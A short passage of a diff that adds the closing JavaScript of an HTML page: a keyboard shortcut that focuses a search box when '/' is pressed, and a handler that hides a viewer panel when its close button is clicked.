+  if(e.key==='/' && e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA'){ e.preventDefault(); document.getElementById('search').focus(); }
+});
+
+document.getElementById('close-viewer').addEventListener('click', () => {
+  document.getElementById('viewer').style.display = 'none';
+});
+
+</script>
+</body>
+</html>
